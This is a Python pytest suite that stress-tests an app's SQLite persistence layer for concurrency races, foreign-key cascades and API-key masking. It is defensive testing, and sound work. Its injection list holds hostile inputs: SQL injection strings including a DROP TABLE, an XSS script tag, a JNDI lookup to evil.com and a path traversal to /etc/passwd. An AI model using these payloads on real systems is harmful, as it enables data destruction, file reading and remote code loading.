"""
Adversarial Stress Test Suite for Milestone 1: SQLite Persistence & Secret Masking.
Authored by Challenger 1.

Tests:
1. High-concurrency reads/writes under SQLite WAL mode with connection pools/tasks.
2. Concurrent session creation race conditions.
3. Concurrent init_db race conditions.
4. Injection payloads across all entity CRUD operations (SQLi, special chars, null bytes, huge inputs).
5. Secret masking idempotence, edge cases, round-trip cycles, and placeholder retention.
6. Foreign key integrity and cascading deletes (Sessions -> Messages, VoiceProfiles -> Sessions).
7. Out-of-bounds parameter updates and DB corruption risk.
8. Asymmetric non-existent ID handling (e.g. set_active_provider with non-existent ID).
9. MaskingFilter log sanitization coverage and stress throughput.
"""

import asyncio
import os
import random
import string
import tempfile
import pytest
import aiosqlite
import pydantic

from galgame2voice.database.session import get_db, init_db
from galgame2voice.database.crud import (
    mask_api_key, is_masked_key,
    get_settings, get_settings_raw, update_settings, verify_console_token,
    list_providers, get_provider, get_provider_raw, get_active_provider, get_active_provider_raw,
    create_provider, update_provider, set_active_provider, delete_provider,
    list_voice_profiles, get_voice_profile, get_active_voice_profile,
    create_voice_profile, update_voice_profile, set_active_voice_profile, delete_voice_profile,
    get_or_create_session, get_session, list_sessions, delete_session, clear_session_messages,
    add_message, get_recent_messages, count_session_messages
)
from galgame2voice.database.models import (
    SettingsUpdate, ProviderCreate, ProviderUpdate,
    VoiceProfileCreate, VoiceProfileUpdate,
    SessionCreate, SessionUpdate,
    MessageCreate
)
from galgame2voice.utils.logger import MaskingFilter


@pytest.fixture
async def adversarial_db():
    """Yields a clean initialized temporary SQLite database path."""
    fd, path = tempfile.mkstemp(suffix=".db", prefix="adv_m1_test_")
    os.close(fd)
    await init_db(path)
    yield path
    if os.path.exists(path):
        try:
            os.remove(path)
        except OSError:
            pass


# ============================================================================
# 1. High Concurrency & Race Condition Stress Tests
# ============================================================================

class TestConcurrencyAndStress:
    """Adversarial stress tests for concurrent access and race conditions."""

    @pytest.mark.asyncio
    async def test_high_concurrency_interleaved_crud(self, adversarial_db):
        """
        Stress test: 40 concurrent async workers executing simultaneous reads and writes
        across settings, providers, voice profiles, sessions, and messages.
        """
        async def worker_task(worker_id: int):
            async with get_db(adversarial_db) as conn:
                for i in range(10):
                    op = (worker_id + i) % 5
                    if op == 0:
                        # Update settings
                        await update_settings(conn, SettingsUpdate(
                            speed_factor=round(0.5 + (random.random() * 2.0), 2),
                            temperature=round(random.random(), 2)
                        ))
                    elif op == 1:
                        # Session and message operations with distinct session ids
                        sess_id = f"worker-sess-{worker_id}-{i}"
                        await get_or_create_session(conn, sess_id)
                        await add_message(conn, MessageCreate(
                            session_id=sess_id,
                            role="user" if i % 2 == 0 else "assistant",
                            content_chinese=f"并发测试消息_{worker_id}_{i}",
                            content_japanese=f"並行テストメッセージ_{worker_id}_{i}",
                            latency_ms=random.randint(50, 500)
                        ))
                    elif op == 2:
                        # Read active provider and settings
                        p = await get_active_provider(conn)
                        assert p is not None
                        s = await get_settings(conn)
                        assert s.active_provider_id is not None
                    elif op == 3:
                        # Read recent messages
                        sess_id = f"worker-sess-{worker_id}-{max(0, i-1)}"
                        msgs = await get_recent_messages(conn, sess_id, limit=5)
                        assert isinstance(msgs, list)
                    elif op == 4:
                        # Query voice profiles
                        profiles = await list_voice_profiles(conn)
                        assert len(profiles) >= 1

        # Spawn 40 concurrent workers (400 total operations)
        tasks = [worker_task(w) for w in range(40)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for idx, res in enumerate(results):
            if isinstance(res, Exception):
                pytest.fail(f"Worker {idx} failed with exception: {res}")

        # Verify DB integrity after concurrent storm
        async with get_db(adversarial_db) as conn:
            s = await get_settings(conn)
            assert s is not None
            providers = await list_providers(conn)
            assert len(providers) == 8

    @pytest.mark.asyncio
    async def test_concurrent_session_creation_race(self, adversarial_db):
        """
        Race condition test: 25 concurrent tasks calling get_or_create_session for the SAME session_id.
        Exposes whether check-then-insert lacks concurrency protection (e.g. INSERT OR IGNORE).
        """
        target_session_id = "shared-race-session-999"

        async def create_task():
            async with get_db(adversarial_db) as conn:
                return await get_or_create_session(conn, target_session_id, channel="web")

        tasks = [create_task() for _ in range(25)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        exceptions = [res for res in results if isinstance(res, Exception)]
        if exceptions:
            pytest.fail(f"Concurrent get_or_create_session failed with {len(exceptions)} exceptions: {exceptions[0]}")

        for res in results:
            assert res.id == target_session_id

        # Verify exactly 1 session was created in DB
        async with get_db(adversarial_db) as conn:
            async with conn.execute("SELECT COUNT(*) FROM sessions WHERE id = ?", (target_session_id,)) as cursor:
                row = await cursor.fetchone()
                assert row[0] == 1

    @pytest.mark.asyncio
    async def test_concurrent_init_db_race(self):
        """
        Race condition test: Multiple concurrent workers running init_db on a fresh database file.
        Verifies whether table/seed creation handles concurrent first-start safely.
        """
        fd, path = tempfile.mkstemp(suffix=".db", prefix="adv_init_race_")
        os.close(fd)
        if os.path.exists(path):
            os.remove(path)

        try:
            tasks = [init_db(path) for _ in range(10)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            exceptions = [res for res in results if isinstance(res, Exception)]
            if exceptions:
                pytest.fail(f"Concurrent init_db failed with exception: {exceptions[0]}")

            async with get_db(path) as conn:
                profiles = await list_voice_profiles(conn)
                assert len(profiles) == 1
                providers = await list_providers(conn)
                assert len(providers) == 8
        finally:
            if os.path.exists(path):
                os.remove(path)


# ============================================================================
# 2. Injection & Malicious Payload Tests
# ============================================================================

class TestInjectionAndFuzzing:
    """Adversarial injection and extreme boundary tests."""

    INJECTION_PAYLOADS = [
        "'; DROP TABLE settings; --",
        "' OR '1'='1' --",
        "admin'--",
        "\" OR \"\"=\"",
        "<script>alert('xss')</script>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08",  # Control characters
        "👾👽🤖🧙‍♂️🌸💥🔥🌟",  # Complex emojis and unicode
        "SELECT * FROM providers WHERE 'a'='a';",
        "../../../etc/passwd",
        "\\" * 50,  # Repeated backslashes
        " " * 100,  # Whitespace padding
        "A" * 10000,  # 10KB string
    ]

    @pytest.mark.asyncio
    async def test_sql_injection_in_session_and_messages(self, adversarial_db):
        """Test SQL injection strings in session_id, user_id, channel, and message content."""
        async with get_db(adversarial_db) as conn:
            for idx, payload in enumerate(self.INJECTION_PAYLOADS):
                sess_id = f"sess_{idx}_{payload[:20]}"
                sess = await get_or_create_session(conn, session_id=sess_id, channel="web", user_id=payload[:30])
                assert sess.id == sess_id

                msg = await add_message(conn, MessageCreate(
                    session_id=sess_id,
                    role="user",
                    content_chinese=payload,
                    content_japanese=payload,
                    audio_url=f"/audio/{payload[:10]}.wav",
                    latency_ms=100
                ))
                assert msg.content_chinese == payload

                # Verify retrieval
                fetched_msgs = await get_recent_messages(conn, sess_id, limit=5)
                assert len(fetched_msgs) >= 1
                assert fetched_msgs[-1].content_chinese == payload

            # Verify tables still exist and were not dropped
            async with conn.execute("SELECT COUNT(*) FROM settings;") as cursor:
                row = await cursor.fetchone()
                assert row[0] == 1

    @pytest.mark.asyncio
    async def test_sql_injection_in_provider_crud(self, adversarial_db):
        """Test injection payloads in provider creation and updates."""
        async with get_db(adversarial_db) as conn:
            for idx, payload in enumerate(self.INJECTION_PAYLOADS):
                provider_id = f"adv_prov_{idx}"
                created = await create_provider(conn, ProviderCreate(
                    id=provider_id,
                    name=payload[:50],
                    api_base_url=f"https://api.example.com/{payload[:10]}",
                    api_key=f"sk-secret_{payload[:20]}",
                    chat_model=payload[:30],
                    custom_headers={"X-Custom": payload[:50]}
                ))
                assert created.id == provider_id

                # Query raw
                raw_p = await get_provider_raw(conn, provider_id)
                assert raw_p is not None
                assert raw_p.custom_headers == {"X-Custom": payload[:50]}

                # Delete
                deleted = await delete_provider(conn, provider_id)
                assert deleted is True

    @pytest.mark.asyncio
    async def test_sql_injection_in_voice_profiles(self, adversarial_db):
        """Test injection payloads in voice profile fields."""
        async with get_db(adversarial_db) as conn:
            for idx, payload in enumerate(self.INJECTION_PAYLOADS):
                profile_name = f"AdvProfile_{idx}_{payload[:10]}"
                created = await create_voice_profile(conn, VoiceProfileCreate(
                    name=profile_name,
                    description=payload,
                    gpt_weights_path=f"weights/{payload[:10]}.ckpt",
                    sovits_weights_path=f"weights/{payload[:10]}.pth",
                    ref_audio_path=f"ref/{payload[:10]}.wav",
                    prompt_text=payload,
                    system_prompt=payload
                ))
                assert created.id > 1
                assert created.name == profile_name

                # Clean up
                await delete_voice_profile(conn, created.id)


# ============================================================================
# 3. Secret Masking, Retention & Lifecycle Cycles
# ============================================================================

class TestSecretMaskingAndRetention:
    """Adversarial validation of API key masking, retention, and non-leakage."""

    @pytest.mark.parametrize("input_key,expected_mask,is_masked", [
        (None, "", False),
        ("", "", False),
        ("   ", "", False),
        ("123", "********", False),
        ("12345678", "********", False),
        ("sk-12345678", "********", False),
        ("sk-123456789", "sk-****6789", True),
        ("sk-proj-abc123def456ghi789jkl012mno345pqr", "sk-****345pqr"[-7:], True),
        ("sk-ant-api03-abcdefghijklmnopqrstuvwxyz", "sk-****wxyz", True),
        ("ghp_1234567890abcdefghijklmnopqrstuv", "ghp****stuv", True),
        ("123456789:ABCdefGhIJKlmnoPQRstuvwxYZ-123456", "123****3456", True),
    ])
    def test_mask_api_key_patterns(self, input_key, expected_mask, is_masked):
        """Check masking behavior across diverse token formats."""
        res = mask_api_key(input_key)
        if expected_mask.startswith("sk-****") or "****" in expected_mask:
            assert "****" in res
            if input_key and len(input_key) > 8:
                assert input_key[-4:] in res
        if is_masked:
            assert is_masked_key(res) is True

    @pytest.mark.asyncio
    async def test_repeated_masking_round_trip_preservation(self, adversarial_db):
        """
        Simulate real-world Web UI scenario:
        1. Set real key 'sk-super-secret-key-123456789'
        2. UI fetches config -> receives masked key 'sk-****6789'
        3. User edits a different field (e.g. temperature) and submits form with masked key
        4. DB must retain 'sk-super-secret-key-123456789' and NOT overwrite with 'sk-****6789'
        5. Repeat this 10 times in a row.
        6. User explicitly submits a brand new key 'sk-new-secret-9876543210' -> DB must update.
        """
        async with get_db(adversarial_db) as conn:
            # Step 1: Create provider with real secret
            real_key_1 = "sk-super-secret-key-123456789"
            await create_provider(conn, ProviderCreate(
                id="cycle_provider",
                name="Cycle Provider",
                api_base_url="https://api.example.com",
                api_key=real_key_1,
                chat_model="test-model"
            ))

            # Step 2 & 3 & 4: 10 repeated round-trips
            for cycle in range(10):
                # UI loads provider (masked)
                ui_view = await get_provider(conn, "cycle_provider", mask=True)
                assert ui_view.api_key == "sk-****6789"
                assert ui_view.api_key != real_key_1

                # UI sends update with masked key and new model
                await update_provider(conn, "cycle_provider", ProviderUpdate(
                    chat_model=f"test-model-cycle-{cycle}",
                    api_key=ui_view.api_key
                ))

                # Verify backend storage did not get overwritten with masked string
                internal = await get_provider_raw(conn, "cycle_provider")
                assert internal.api_key == real_key_1
                assert internal.chat_model == f"test-model-cycle-{cycle}"

            # Step 6: User genuinely updates key
            real_key_2 = "sk-new-secret-9876543210"
            await update_provider(conn, "cycle_provider", ProviderUpdate(
                api_key=real_key_2
            ))
            internal2 = await get_provider_raw(conn, "cycle_provider")
            assert internal2.api_key == real_key_2

            # Masked view should reflect new ending digits
            ui_view2 = await get_provider(conn, "cycle_provider", mask=True)
            assert ui_view2.api_key == "sk-****3210"

    @pytest.mark.asyncio
    async def test_telegram_bot_token_masking_round_trip(self, adversarial_db):
        """Verifies settings telegram_bot_token masking and update retention."""
        real_token = "987654321:ABCdefGHI-jklMNO_pqrSTU123456"
        async with get_db(adversarial_db) as conn:
            # Set token
            await update_settings(conn, SettingsUpdate(telegram_bot_token=real_token))
            raw = await get_settings_raw(conn)
            assert raw.telegram_bot_token == real_token

            # UI read
            ui_settings = await get_settings(conn, mask=True)
            assert is_masked_key(ui_settings.telegram_bot_token)
            assert ui_settings.telegram_bot_token != real_token

            # UI submit with masked token
            await update_settings(conn, SettingsUpdate(
                speed_factor=1.5,
                telegram_bot_token=ui_settings.telegram_bot_token
            ))

            # Verify retained
            raw2 = await get_settings_raw(conn)
            assert raw2.telegram_bot_token == real_token
            assert raw2.speed_factor == 1.5


# ============================================================================
# 4. Out-of-Bounds & Data Integrity Defense
# ============================================================================

class TestDataIntegrityAndBoundaryDefense:
    """Tests boundary validation and non-existent entity handling."""

    @pytest.mark.asyncio
    async def test_set_active_provider_non_existent(self, adversarial_db):
        """
        Stress test: Calling set_active_provider with non-existent provider ID.
        Should return False or fail cleanly without unsetting active provider or corrupting state.
        """
        async with get_db(adversarial_db) as conn:
            # Check current active provider
            active_before = await get_active_provider(conn)
            assert active_before is not None

            # Attempt to set non-existent provider
            res = await set_active_provider(conn, "non_existent_provider_id_999")
            
            # Active provider should NOT be broken / None
            active_after = await get_active_provider(conn)
            assert active_after is not None, "set_active_provider with invalid ID broke active provider state!"

    @pytest.mark.asyncio
    async def test_settings_update_out_of_bounds_validation(self, adversarial_db):
        """
        Adversarial test: Submitting out-of-range values in SettingsUpdate.
        Checks if invalid DB updates cause permanent ValidationError bricking get_settings().
        """
        async with get_db(adversarial_db) as conn:
            # Try setting invalid speed_factor (e.g. 50.0 where max is 3.0)
            # If SettingsUpdate does not validate, it will write 50.0 to SQLite,
            # and then get_settings() will crash because SettingsResponse validates ge/le!
            try:
                await update_settings(conn, SettingsUpdate(speed_factor=50.0))
            except (pydantic.ValidationError, ValueError):
                pass  # Good, caught at update level

            # Database get_settings must not be bricked
            settings = await get_settings(conn)
            assert settings.speed_factor <= 3.0, "DB persisted out-of-bounds speed_factor!"


# ============================================================================
# 5. Foreign Keys & Cascading Deletions
# ============================================================================

class TestForeignKeysAndIntegrity:
    """Verifies relational integrity, foreign key constraints, and cascade actions."""

    @pytest.mark.asyncio
    async def test_session_cascade_delete_messages(self, adversarial_db):
        """Deleting a session must cascade delete all associated messages."""
        async with get_db(adversarial_db) as conn:
            sess_id = "cascade-test-sess-1"
            await get_or_create_session(conn, sess_id)

            for i in range(5):
                await add_message(conn, MessageCreate(
                    session_id=sess_id,
                    role="user",
                    content_chinese=f"消息_{i}"
                ))

            assert await count_session_messages(conn, sess_id) == 5

            # Delete the session
            await delete_session(conn, sess_id)

            # Messages for this session should be 0
            async with conn.execute("SELECT COUNT(*) FROM messages WHERE session_id = ?", (sess_id,)) as cursor:
                row = await cursor.fetchone()
                assert row[0] == 0

    @pytest.mark.asyncio
    async def test_voice_profile_delete_sets_session_profile_null(self, adversarial_db):
        """Deleting a voice profile should SET NULL on referencing sessions."""
        async with get_db(adversarial_db) as conn:
            # Create voice profile
            vp = await create_voice_profile(conn, VoiceProfileCreate(
                name="Referenced Profile",
                gpt_weights_path="g.ckpt",
                sovits_weights_path="s.pth",
                ref_audio_path="r.wav",
                prompt_text="text"
            ))

            # Create session pointing to this profile
            sess_id = "sess-with-vp"
            await conn.execute("INSERT INTO sessions (id, voice_profile_id) VALUES (?, ?)", (sess_id, vp.id))
            await conn.commit()

            # Delete voice profile
            await delete_voice_profile(conn, vp.id)

            # Check session's voice_profile_id is now NULL
            async with conn.execute("SELECT voice_profile_id FROM sessions WHERE id = ?", (sess_id,)) as cursor:
                row = await cursor.fetchone()
                assert row is not None
                assert row[0] is None


# ============================================================================
# 6. Logger Sanitization Filter Stress Tests
# ============================================================================

class TestLoggerSanitizationFilter:
    """Stress tests and coverage for MaskingFilter zero-leakage guarantee."""

    def test_logger_masking_filter_patterns(self):
        filter_instance = MaskingFilter()

        test_cases = [
            ("Calling OpenAI with key sk-proj-1234567890abcdef1234567890 for chat", "****"),
            ("Authorization: Bearer my-secret-jwt-token-1234567890", "[MASKED_TOKEN]"),
            ("Telegram bot started: 123456789:ABCDefgh-1234567890abcdefghijklmn", "[MASKED_TELEGRAM_TOKEN]"),
            ('Payload: {"api_key": "sk-secret123456", "model": "gpt-4o"}', '****'),
            ("Connecting to https://example.com/api?api_key=secretkey123&other=1", "[MASKED]"),
        ]

        for original, expected_substring in test_cases:
            sanitized = filter_instance.sanitize(original)
            assert expected_substring in sanitized
            # Ensure sensitive raw substrings are not in sanitized output
            if "sk-proj-1234567890abcdef1234567890" in original:
                assert "sk-proj-1234567890abcdef1234567890" not in sanitized
            if "my-secret-jwt-token-1234567890" in original:
                assert "my-secret-jwt-token-1234567890" not in sanitized
